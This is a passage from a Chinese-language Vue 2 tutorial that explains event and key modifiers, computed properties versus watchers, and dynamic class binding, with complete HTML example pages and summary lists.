}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n那data存储数据咋不也直接给到vm？咋还要经过_data这个对象呀？其实前面就说过data与methods不一样，methods里的只是方法，没有复杂的变化，直接给vm就行了（Vue框架内部并不会用到methods）。而data里的是数据，经常变动还涉及到页面重新渲染，再说，多加一个_data也方便内部框架使用，web开发人员相当于是外部使用，两者分开来更加科学。\n\n----------------------------------------\n\n总结拓展：\n\n 1. 使用v-on:xxx="" 或 @xxx=""绑定事件，其中xxx是事件名；\n 2. 事件的回调需要配置在methods对象中，最终会在vm上；\n 3. methods中配置的函数，最好不要使用箭头函数！否则this就不是vm了；\n 4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象；\n 5. @click="demo"和@click="demo($event)"效果一致，但后者可以传参。\n 6. methods并不像data还有数据代理，它是直接给vm的，并没有_methods的中间层。\n\n----------------------------------------\n\n\n# 3.2 事件修饰符\n\n在开发过程中经常遇到event.preventDefault()或event.stopPropagation()等需求，Vue给我们提供事件修饰符来简化写法（将回调函数中处理DOM的步骤抽离出来）。事件修饰符常使用@click.xxx=""的写法，其中.xxx就是事件修饰符，事件修饰符有.prevent、.stop、.once、.capture、.self、.passive，前三个会比较常见。\n\n * .prevent是用于阻止元素的默认行为，比如<a>标签的默认行为是跳转页面，点击<a>要弹出提示框但是不让跳转页面，就可以使用@click.prevent=""，功能同回调函数里的event.preventDefault()一样。\n * .stop是用于阻止事件冒泡，比如多层<div>嵌套，但我只让最里层的<div>的事件触发，让外层<div>都不触发事件，就可以使用@click.stop=""，功能同回调函数里的event.stopPropagation()一样。\n * .once最简单，让元素只进行一次事件触发。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        * { margin: 20px 10px; }\n        /*display: flow-root会创建无副作用的BFC*/\n        .outer {\n            display: flow-root;\n            width: 200px;\n            height: 100px;\n            background-color: green;\n        }\n        .inner {\n            width: 150px;\n            height: 40px;\n            margin: 10px 20px;\n            background-color: brown;\n        }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- .prevent阻止默认事件 --\x3e\n        <a @click.prevent="showInfo" href="">点击我提示信息</a>\n        \x3c!-- .stop阻止事件冒泡，inner区域触发得了事件，并阻止click事件传到outer区域 --\x3e\n        <div class="outer" @click="showInfo">outer\n            <div class="inner" @click.stop="showInfo">inner，点击我</div>\n        </div>\n        \x3c!-- .once让事件只触发一次 --\x3e\n        <div class="inner" @click.once="showInfo">只能点击我提示一次信息哦</div>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showInfo() {\n                    alert(\'提示！！！\');\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n.capture、.self、.passive不太常用。\n\n * .capture是使用事件的捕获模式。嵌套元素（例如多层<div>嵌套）上有点击事件时，是从最外层向最里层逐层检测并捕获到事件的（捕获阶段），然后由捕获到事件所在元素由里向外逐层调用回调函数的（冒泡阶段），那.capture使用捕获模式会在捕获阶段就调用回调函数。\n * .self表示只有当event.target是当前操作的元素时才触发事件。如果嵌套元素点击最里层元素，向外冒泡阶段时，event.target会一直是最里层那个元素，外层元素使用了.self就会取消自身的事件触发（相当于阻止了冒泡）。\n * .passive让事件的默认行为立即执行，无需等待事件回调执行完毕。有些事件是在事件回调函数执行完毕才让元素的默认行为执行，例如wheel鼠标滚轮滚动事件，如果回调函数处理很慢很慢，那鼠标滚动效果在页面上就会卡顿，这就可以使用@wheel.passive="xxx"来解决问题。其实有些事件本身就是默认行为先执行，可就用不到.passive了，其实.passive在移动端会用的多点。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        * { margin: 20px 10px; }\n        /*display: flow-root会创建无副作用的BFC*/\n        .outer {\n            display: flow-root;\n            width: 200px;\n            height: 100px;\n            background-color: green;\n        }\n        .inner {\n            width: 150px;\n            height: 40px;\n            margin: 10px 20px;\n            background-color: brown;\n        }\n        .ul {\n            width: 200px;\n            height: 150px;\n            overflow: auto;\n            background-color: orangered;\n        }\n        li { height: 70px; }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- .capture使用事件捕获模式，并且是加在外层容器上 --\x3e\n        \x3c!-- 正常情况是冒泡阶段处理事件，先提示2再提示1；如果是捕获阶段处理，则先提示1再提示2 --\x3e\n        <div class="outer" @click.capture="showInfo($event, 1)">outer，点击我提示1\n            <div class="inner" @click="showInfo($event, 2)">inner，点击我提示2</div>\n        </div>\n        \x3c!-- .self，只有event.target是当前操作的元素时才触发事件 --\x3e\n        \x3c!-- 点击inner，event.target会一直是inner，冒泡到outer，发现target与当前元素不一样，所以outer不会触发click --\x3e\n        <div class="outer" @click.self="showInfo">outer\n            <div class="inner" @click="showInfo">inner，点击我提示</div>\n        </div>\n        \x3c!-- .passive，事件的默认行为立即执行，无需等待事件回调执行完毕 --\x3e\n        \x3c!-- 使用鼠标滚轮，由于.passive会让页面效果先出现再去调用demo函数 --\x3e\n        <ul class="ul" @wheel.passive="demo">\n            <li>1</li>\n            <li>2</li>\n            <li>3</li>\n            <li>4</li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showInfo(e, msg) {\n                    const str = msg ? msg : \'\';\n                    alert(\'提示\' + str);\n                },\n                demo() {\n                    for (let i = 0; i < 20000; i++) {\n                        console.log(i);\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n事件修饰符能连用，比如一个<a>标签有href属性，并且<a>标签还在一个<div>内部，要阻止事件冒泡还要阻止默认行为，那代码可以这样写：\n\n<div class="outer" @click="showInfo">\n    \x3c!-- 也可以@click.prevent.stop，效果虽然一样，但运行还是有先后的 --\x3e\n    <a href="www.baidu.com" @click.stop.prevent="showInfo">请点击我</a>\n</div>\n\n\n1\n2\n3\n4\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. prevent，阻止默认事件（常用）；\n 2. stop，阻止事件冒泡（常用）；\n 3. once，事件只触发一次（常用）；\n 4. capture，使用事件的捕获模式；\n 5. self，只有event.target是当前操作的元素时才会触发事件；\n 6. passive，事件的默认行为立即执行，无需等待事件回调函数执行完毕。\n 7. 事件修饰符能连用，比如即阻止默认行为又阻止事件冒泡，@click.stop.prevent。\n\n----------------------------------------\n\n\n# 3.3 键盘事件\n\n在开发过程中，我们经常需要判断是什么按键按下再去走什么逻辑，例如在键盘事件回调中写if (e.key !== \'Enter\') return表示只有当回车键按下后再继续执行。其实Vue给我们提供按键修饰符来简化这些写法，常见的按键修饰符有.enter、.delete、.esc、.space、.tab、.up、.down、.left、.right。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- enter回车，delete删除或退格，esc退出，space空格，tab换行，up、down、left、right是上下左右 --\x3e\n        <input type="text" placeholder="按下回车提示输入的值" @keyup.enter="showInfo">\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showInfo(e) {\n                    console.log(e.key, e.keyCode);\n                    alert(e.target.value);\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nVue可能没有为所有键设置按键修饰符，其实是可以使用原始key（e.key）来暂替的，需要注意的是如果是多单词组成的key那就得使用-符号分隔了。\n\n\x3c!-- CapsLock是大小写转换，使用时小写并用-分隔，caps-lock --\x3e\n<input type="text" placeholder="按下回车提示输入的值" @keyup.caps-lock="showInfo">\n\n\n1\n2\n\n\n有几个键用法稍微特殊点，tab、ctrl、alt、shift、meta，后四个是系统键饰键。tab的特殊之处是一般用于keydown，因为如果是keyup的话，键弹起的时候焦点已经转移了，其后回调函数不会被执行。系统键键也是类似的情况，用keydown是正常情况，用keyup的话，“系统键+其他键”弹起时才会触发keyup的回调函数。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- @keydown.ctrl会正常，@keyup.ctrl只有当ctrl+其他键弹起时触发，比如ctrl+a --\x3e\n        <input type="text" placeholder="按下回车提示输入的值" @keyup.ctrl="showInfo">\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showInfo(e) {\n                    console.log(e.key, e.keyCode);\n                    alert(e.target.value);\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n按键修饰符也是可以连用的，对特定的ctrl+x进行识别（识别x，上面的不能识别x是谁），只允许这样的组合键触发事件回调函数。\n\n\x3c!-- 只有当ctrl+7才走showInfo函数 --\x3e\n<input type="text" placeholder="按下回车提示输入的值" @keyup.ctrl.7="showInfo">\n\n\n1\n2\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 常见的按键修饰符：enter回车，delete删除或退格，esc退出，space空格，tab换行，up、down、left、right是上下左右。\n 2. Vue未提供按键修饰符的按键，可以使用按键原始的key值去绑定，但注意要转换为xxx-xxx（短横线命名）的形式。\n 3. 系统修饰键，ctrl、alt、shift、meta：\n    1. 配合keyup使用：按下系统键的同时，再按下其他键，随后释放其他键，事件才被触发；\n    2. 配合keydown使用：正常触发事件。\n 4. 也可以使用keyCode去指定具体的按键，但不推荐，因为keyCode标准已被弃用了。\n 5. Vue.config.keyCodes.自定义键名 = 键码;，可以去定制按键修饰符，但不太推荐。\n\n----------------------------------------\n\n\n# 四、计算属性和监视属性\n\n\n# 4.1 计算属性\n\n有个经典的需求，输入“姓”和“名”，可以展示“全名”，动态修改“姓”或“名”时，全名也要跟着改变。很简单呀，“姓”、“名”和“全名”我都使用插值来实现。但是如果出现全名的“展示位数限制”或“大小写转换”等，那“全名”的插值就会比较复杂，这不符合Vue风格指南-模板中简单的表达式，推荐使用方法或计算属性。\n\n\x3c!-- 不符合“模板中简单的表达式”建议，推荐使用方法或计算属性 --\x3e\n全名：<span>{{lastName.slice(0, 3).toUpperCase()}}-{{firstName.slice(0, 3).toUpperCase()}}</span>\n\n\n1\n2\n\n\n使用插值搭配方法（methods）的方案，代码如下。这方案有可优化点的，如果页面使用fullName的地方有很多，那就会调用很多次，如果有缓存就好了；data数据更新时，模板会重新解析，即使是与“全名”无关的属性更新了也会导致fullName再次调用。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        测试：<input type="text" v-model="x"><br><br>\x3c!-- 它改变也会让fullName调用 --\x3e\n        全名：<span>{{fullName()}}</span><br><br>\n        全名：<span>{{fullName()}}</span><br><br>\n        全名：<span>{{fullName()}}</span><br><br>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\',\n                x: \'测试\'\n            },\n            methods: {\n                fullName() {\n                    // 页面有几次调用，就执行几次，没有缓存可言\n                    console.log(\'调用fullName\');\n                    // 在这里随意你做字符串长度限制，或者反转，或者大小写变换\n                    return this.lastName + \'-\' + this.firstName;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\nVue提供的计算属性解决了上面的两个问题，并且如果修改“全名”也能让对应的“姓”和“名”随之修改。计算属性是定义在computed里的（computed与methods平级），它根据data里的属性计算出来的，并且它对外提供getter/setter供其他人读取和修改（也是用Object.defineProperty()实现）。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        测试：<input type="text" v-model="x"><br><br>\x3c!-- 它不影响fullName --\x3e\n        全名：<span>{{fullName}}</span><br><br>\x3c!-- fullName会出现在vm上 --\x3e\n        全名：<span>{{fullName}}</span><br><br>\n        全名：<span>{{fullName}}</span><br><br>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\',\n                x: \'测试\'\n            },\n            computed: {\n                fullName: {\n                    // 初次读取fullName时被调用，在所依赖属性数据改变时也会被调用\n                    get() {\n                        console.log(\'调用fullName-get\');\n                        return this.lastName + \'-\' + this.firstName;\n                    },\n                    // 在修改fullName时被调用\n                    set(value) {\n                        console.log(\'调用fullName-set\');\n                        const str = value.split(\'-\');\n                        this.lastName = str[0];\n                        this.firstName = str[1];\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n计算属性是可以简写的，当没有set方法只有get方法时，可以直接将计算属性写成方法，方法体就是get的方法体。但是在模板中还是以属性的形式来使用，意思是你不要加上()弄成函数调用了。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        全名：<span>{{fullName}}</span><br><br>\x3c!-- 不要弄成函数调用 --\x3e\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\'\n            },\n            computed: {\n                // 没有set方法只有get方法时可简写\n                fullName() {\n                    return this.lastName + \'-\' + this.firstName;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 计算属性定义：要用的属性不存在，通过已有属性计算得来。\n 2. 计算属性原理：底层借助了Object.defineProperty()提供的getter/setter。\n 3. 计算属性的get在初次读取时被调用一次，也会在所依赖属性改变时被调用。\n 4. 计算属性优势：与methods实现相比，内部有缓存机制（能复用），还可以排除无关属性的影响。\n 5. 计算属性可以在没有set方法只有get方法情况下简写，使用处还是属性的形式。\n\n----------------------------------------\n\n\n# 4.2 监视属性\n\n上一小节的例子可以用监视属性实现，监视属性就是用来监视某些属性的变化，然后做一些对应的操作。监视属性定义在watch里（watch与computed和methods平级），watch里的常用handler来处理操作（computed则是getter/setter）。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        全名：<span>{{fullName}}</span><br><br>\x3c!-- fullName会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\',\n                fullName: \'张-三\'\n            },\n            watch: {\n                lastName: {\n                    // watch里的handler 对应 computed里的getter/setter\n                    handler(newVal, oldVal) {\n                        this.fullName = newVal + \'-\' + this.firstName;\n                    }\n                },\n                firstName: {\n                    handler(newVal, oldVal) {\n                        this.fullName = this.lastName + \'-\' + newVal;\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\nwatch还有两个常用的配置，immediate配置表示是否在初始化时就让handler调用一次（默认值是false），deep配置表示是否进行深度监视（默认值是false）。还有一点，如果你不清楚在Vue实例创建时该怎么监视属性，那么可以在Vue实例创建完再监视属性，写法vm.$watch(\'xxx\', {});，xxx就是要监视的属性，{}同之前的写法一样。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        全名：<span>{{fullName}}</span><br><br>\x3c!-- fullName会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: { a: \'张\', b: \'1\' },\n                firstName: \'三\',\n                fullName: \'张-三\'\n            },\n            watch: {\n                lastName: {\n                    immediate: true, // 初始化时让handler调用一次\n                    deep: true, // 深度监视\n                    handler(newVal, oldVal) { // lastName变化了会执行handler\n                        console.log(\'watch-lastName\');\n                        this.fullName = newVal + \'-\' + this.firstName;\n                    }\n                },\n                firstName: {\n                    // 正常写法只有handler\n                    handler(newVal, oldVal) {\n                        console.log(\'watch-firstName\');\n                        this.fullName = this.lastName + \'-\' + newVal;\n                    }\n                }\n            }\n        });\n        // vm创建完后再去监视属性\n        /* vm.$watch(\'lastName\', {\n            immediate: true, // 初始化时让handler调用一次\n            deep: true, // 深度监视\n            handler(newVal, oldVal) { // lastName变化了会执行handler\n                console.log(\'watch-lastName\');\n                this.fullName = newVal + \'-\' + this.firstName;\n            }\n        });\n        vm.$watch(\'firstName\', {\n            // 正常写法只有handler\n            handler(newVal, oldVal) {\n                console.log(\'watch-firstName\');\n                this.fullName = this.lastName + \'-\' + newVal;\n            }\n        }); */\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n\n\nwatch也是可以简写的，当immediate和deep两配置项是默认值可省略时，可以将handler的函数形式直接给监视属性用。\n\nwatch: {\n    // 正常写法\n    lastName: {\n        immediate: true,\n        deep: true,\n        handler(newVal, oldVal) {\n            console.log(\'watch-lastName\');\n            this.fullName = newVal + \'-\' + this.firstName;\n        }\n    },\n    // 没有immediate和deep后可简写\n    firstName(newVal, oldVal) {\n        console.log(\'watch-firstName\');\n        this.fullName = this.lastName + \'-\' + newVal;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 当被监视的属性变化时，handler函数自动被调用，进行相关操作。\n 2. 监视的属性必须存在，才能进行监视！\n 3. 监视属性有两种写法，1) new Vue()时传入watch配置，2)通过vm.$watch监视。\n 4. Vue给我们提供的watch是默认不开启深度监视的，但是Vue在自己框架里监视数据还是用的深度监视。\n 5. 如果开发人员需要对监视属性进行对象内部值改变的监视（深度监视），那就自己写上配置deep: true。\n 6. 监视属性可在immediate和deep两配置项处于默认值时简写，监视属性直接使用handler的函数形式。\n\n----------------------------------------\n\n\n# 4.3 监视属性对比计算属性\n\n我们整理一下同一需求，监视属性和计算属性的代码：\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>计算属性</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        全名：<span>{{fullName}}</span><br><br>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\'\n            },\n            computed: {\n                // 只有getter，没有setter时，计算属性简写\n                fullName() {\n                    return this.lastName + \'-\' + this.firstName;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>监视属性</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        全名：<span>{{fullName}}</span><br><br>\x3c!-- fullName会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\',\n                fullName: \'张-三\'\n            },\n            watch: {\n                // immediate和deep处于默认值false时，监视属性简写，并省略了handler\n                lastName(newVal, oldVal) {\n                    this.fullName = newVal + \'-\' + this.firstName;\n                },\n                firstName(newVal, oldVal) {\n                    this.fullName = this.lastName + \'-\' + newVal;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n我们会发现监视属性的代码会繁杂一点（命令式且重复），这样看来还是计算属性用起来会好些是吧。但是呢在有些场景不能这样说，监视属性中可使用异步操作（setTimeout、ajax请求等），而计算属性就不行了。还有要注意的是，异步操作的回调函数的this一定要注意是指向vm还是Window。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastName"><br><br>\n        名：<input type="text" v-model="firstName"><br><br>\n        全名：<span>{{fullName}}</span><br><br>\x3c!-- fullName会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                lastName: \'张\',\n                firstName: \'三\',\n                fullName: \'张-三\'\n            },\n            watch: {\n                // 监视属性可使用异步操作，而计算属性不能使用\n                lastName(newVal, oldVal) {\n                    // 使用箭头函数是为了让this指向vm\n                    setTimeout(() => {\n                        console.log(\'watch-lastName\');\n                        this.fullName = newVal + \'-\' + this.firstName;\n                    }, 1000);\n                },\n                firstName(newVal, oldVal) {\n                    console.log(\'watch-firstName\');\n                    this.fullName = this.lastName + \'-\' + newVal;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 计算属性能完成的功能，监视属性也能完成，虽然代码会繁杂点。\n 2. 监视属性能完成的功能，计算属性就不一定了，比如异步操作。\n 3. 被Vue实例管理的函数，最好写成普通函数，让this指向vm或组件实例对象。\n 4. 不被Vue实例管理的函数（setTimeout和ajax的回调函数），最好写成箭头函数（会向外找）。\n\n----------------------------------------\n\n\n# 五、在Vue中使用样式\n\n\n# 5.1 绑定class样式\n\n在对html进行样式修改时，你可能会想到使用class配合js代码来修改className从而达到动态控制样式，例如下面的代码片段：\n\n// className原值是\'basic\'，触发某个事件将它修改为\'basic addBg\'\ndocument.getElementById(\'outer\').className = \'basic addBg\';\n\n\n1\n2\n\n\n在Vue中最好不要直接操作DOM，Vue是可以对class使用v-bind指令，将data数据绑定到class，再使用methods里的方法去修改对应的数据，已达到动态修改样式的目的。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        .basic {\n            width: 200px;\n            height: 100px;\n            border: 1px red solid;\n        }\n        .addBg { background-color: royalblue; }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 绑定class与data数据，最后:class会和class进行合并 --\x3e\n        <div class="basic" :class="classMsg" @click="change">点击我，样式会变化</div>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                classMsg: \'\'\n            },\n            methods: {\n                // 修改:class绑定的数据\n                change() { this.classMsg = \'addBg\'; }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n上面那个例子:class的值用的是字符串，但我想加入或删除多个class样式呢？:class的值可以使用数组，使用数组就可以加/删多个class样式。Vue解析模板时会把:class数组形式打散成字符串并与现存的class合并。\n\n:class的值除了可以使用数组，还能使用对象。那使用对象是为了什么场景呢？它比较适合class样式个数不太多，但能动态搭配这些class样式。对象中的key-value的value是布尔值，是用作各样式的开关。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        .basic {\n            width: 200px;\n            height: 100px;\n            border: 1px red solid;\n        }\n        .addBg { background-color: royalblue; }\n        .addRadius { border-radius: 20px; }\n        .addGrad { background-image: linear-gradient(to right, red, yellow); }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- :class的值使用字符串形式，适用于单个样式动态修改 --\x3e\n        <div class="basic" :class="classStr" @click="changeClassStr">点击我！:class是字符串形式</div><br><br>\n        \x3c!-- :class的值使用数组形式，适用于样式很多的样式，也只是简单的修改 --\x3e\n        <div class="basic" :class="classArr" @click="changeClassArr">点击我！:class是数组形式</div><br><br>\n        \x3c!-- :class的值使用对象形式，适用于样式数量一般的场景，动态搭配对象中各种样式 --\x3e\n        <div class="basic" :class="classObj" @click="changeClassObj">点击我！:class是对象形式</div>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const classMsg = [\'addBg\', \'addRadius\', \'addGrad\'];\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                classStr: \'\', // 字符串形式\n                classArr: [], // 数组形式\n                classObj: {   // 对象形式\n                    addBg: false, // 布尔值作为样式使用开关，动态搭配各种样式\n                    addRadius: false,\n                    addGrad: false\n                }\n            },\n            methods: {\n                changeClassStr() {\n                    // 随机出现0, 1, 2中的一个\n                    const index = Math.floor(Math.random(0, 1) * 3);\n                    this.classStr = classMsg[index];\n                },\n                changeClassArr() {\n                    // 随机出现0, 1, 2, 3, 4中的一个\n                    const index = Math.floor(Math.random(0, 1) * 4);\n                    // 截取[0, index)\n                    this.classArr = classMsg.slice(0, index);\n                },\n                